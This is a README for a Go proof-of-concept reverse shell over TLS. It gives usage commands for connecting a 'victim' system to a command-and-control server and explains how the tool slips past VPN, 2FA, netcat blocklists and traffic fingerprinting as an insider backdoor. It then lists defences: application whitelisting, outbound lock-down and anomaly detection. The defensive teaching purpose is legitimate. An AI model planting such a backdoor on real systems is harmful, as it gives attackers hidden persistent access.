# A Simple Reverse Shell Framework over TLS
This is a PoC reverse shell written in Go. 

Purely for educational purposes. Use responsibly.

# Usage
Start command and control server (e.g. replace -linux with -darwin if your server is a macOS one) and select a port of your choosing (port 7788 is used below)
```bash
server-linux 7788
```

Now connect from the target/victim system, specifying the hostname (_command-and-control-server_) of the C&C server, and port that the server is listening on (7788 in our example)
```bash
client-linux command-and-control-server-hostname 7788
```


# Why?
Many network system defenders may not realise the risk associated with arbitrary outbound connection from protected systems. They may still be under the illusion that locking down and blocking inbound connections may be sufficient to protect critical systems.

The purpose is to help point out unsafe assumptions with a simple demo

## You need VPN, 2FA, etc in order to get on my network
This tool completely bypasses your protection, all it needs is an insider willing to plant a tool such as this as a backdoor to give them persistent access which circumvents all your VPN and 2FA technologies.  

Think of that sysadmin that is about to be fired. A disgruntled employee or other malicious insiders could build a similar tool to grant themselves permanent access. 

## I will block netcat/nc installation on my systems
Netcat is a very versatile and useful tool, which has very legitimate applications. However, it is also a traditional tool of choice for obtaining reverse shells. So, it may seem reasonable that blocking/blacklisting it may reduce the risk significantly.

Well, this PoC is not netcat and does not require it. In fact it is a simple plain old Go program. It is so simple as to not require any external library: it is a pure Go implementation, using only built-in primitives. Note that it is not very difficult to evade fingerprint-based scanning technologies

## I will install a network intrusion detection and fingerprint the traffic from this tool
Well, that's a good idea. A network intrusion detection system can do many things and can be used to detect attacks like this, for example, because netcat is done over plain TCP connection, it is possible to inspect packets and fingerprint data exfiltration and similar bad behaviour. 

The problem is that, unlike many similar approaches, this tool works over TLS, so good luck with that.

## I will use threat feeds to fingerprint all your command and control servers as well as certificates that may be used for TLS
Good thinking, but this will not be a reliable or efficient method for detection. This is because the tool can be configured to communicate with any server of the attacker's choosing, so they can spin up a server anywhere in the world and install arbitrary certificates on it, and you are left chasing shadows 

# What is the solution?
You might be wondering ...

## What then is a reliable way to defend against this threat?
There are two strong controls that you can apply to mitigate this threat:

1. *Application Whitelisting*: allowing *only* the applications that you have explicitly permitted to run, to be run on your server, and only those! This is perhaps, the strongest control, but it is not guaranteed because one of your whitelisted applications may itself be compromised and be used as an attack vector.
   
2. *Network lock-down*: if your system does not need to go out to the Internet, block outbound and inbound connections on the firewalls and also using host-based firewalls. Note that even if you totally blocked outbound Internet access, it is not a guaranteed solution. This is because if the protected server is allowed to make outbound connections directly or indirectly to another internal system that in turn has the capability to make outbound Internet connection, this tool can be chained together starting from your sensitive system, and trampolining via other internal systems to ultimately reach one that could communicate directly outbound to the Internet.

Many of the ideas suggested above, while not foolproof, are part of a reasonable defense-in-depth strategy for mitigating this threat.

The key message is to *understand your network and services*! If you know precisely which remote servers and ports that they are allowed to communicate with, that is a great piece of information that can be used to reduce the threat. For example, you may whitelist precisely those remote servers and ports as the only outbound connections you wish to allow as well as which applications are allowed to connect on which ports and to what destinations. 

Where outbound Internet connection is necessary, *consider network anomaly detection* to help you _possibly_ detect unusual connections that may be an indicator of compromise.


# Warning and Disclaimers
This tool is only provided for educational purposes. Do not use it to attack systems. The author assumes no liability or responsibility for anything you do with it or that it does to any system you use it on. See LICENSE for further detail.

## A demo should still use secure communications
This tool is intended to highlight a threat to protected systems and to demonstrate the difficulty in effectively defending against the threat.

It is a very simple program that could be used to demonstrate the importance of monitoring outbound connections from your protected environment for the existence of maliciously planted backdoors. 

However, it is important to do that over TLS too as you'd not like third parties to sniff or inject themselves into your demo. 

CAUTION: Please note that the TLS to the target mitigates casual sniffing and injection risks, however it does not entirely eliminate man-in-the-middle attacks because the client does not verify end certificates. Consider certificate pinning or similar approaches if you'd like to use this technique on a more permanent basis or for other legitimate/useful remote shell designs!
